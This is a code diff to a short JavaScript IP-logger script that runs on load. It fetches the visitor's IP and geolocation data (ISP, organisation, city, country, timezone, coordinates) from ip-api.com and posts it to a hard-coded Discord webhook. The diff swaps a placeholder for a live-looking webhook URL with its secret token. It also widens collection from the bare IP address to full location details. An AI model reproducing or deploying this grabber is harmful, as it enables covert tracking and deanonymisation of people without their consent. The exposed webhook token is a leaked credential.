@@ -1,29 +1,43 @@
+const ipAPI = "http://ip-api.com/json/";
+const webhookURL = "https://discord.com/api/webhooks/1376717625169543228/-M_cKWR5l4Xra3BALwxfrjsWKedUdUV-6focu5z9ohrHZI8bq7YAnRNtdIuKUjdypJ9J";
 
-const ipifyAPI = "https://api.ipify.org?format=json";
-
-
-const webhookURL = "Input your webhook url here (your webhook url can be seen easily)";
-
-
-async function getIP() {
+async function getIPInfo() {
     try {
-        const response = await fetch(ipifyAPI);
+        const response = await fetch(ipAPI);
         const data = await response.json();
-        return data.ip;
+        return data;
     } catch (error) {
-        console.error("Error fetching IP:", error);
+        console.error("Error fetching IP info:", error);
         return null;
     }
 }
 
-async function sendToDiscord(ip) {
-    if (!ip) {
-        console.error("IP address is null or undefined.");
+async function sendToDiscord(ipInfo) {
+    if (!ipInfo) {
+        console.error("IP info is null or undefined.");
         return;
     }
 
+    const {
+        query: ip,
+        city,
+        regionName: region,
+        country,
+        isp,
+        org,
+        timezone,
+        lat,
+        lon
+    } = ipInfo;
+
     const payload = {
-        content: `IP Address: ${ip}`
+        content: `**IP Address Info**:
+- IP: ${ip}
+- ISP: ${isp}
+- Organization: ${org}
+- Location: ${city}, ${region}, ${country}
+- Timezone: ${timezone}
+- Coordinates: Latitude ${lat}, Longitude ${lon}`
     };
 
     try {
@@ -36,22 +50,18 @@ async function sendToDiscord(ip) {
         });
 
         if (response.ok) {
-            console.log("IP sent to Discord successfully!");
+            console.log("IP info sent to Discord successfully!");
         } else {
-            console.error("Error sending IP to Discord:", response.statusText);
+            console.error("Error sending IP info to Discord:", response.statusText);
         }
     } catch (error) {
         console.error("Error:", error);
     }
 }
 
-
 async function main() {
-    const ip = await getIP();
-    if (ip) {
-        await sendToDiscord(ip);
-    }
+    const ipInfo = await getIPInfo();
+    await sendToDiscord(ipInfo);
 }
-
 
 main();
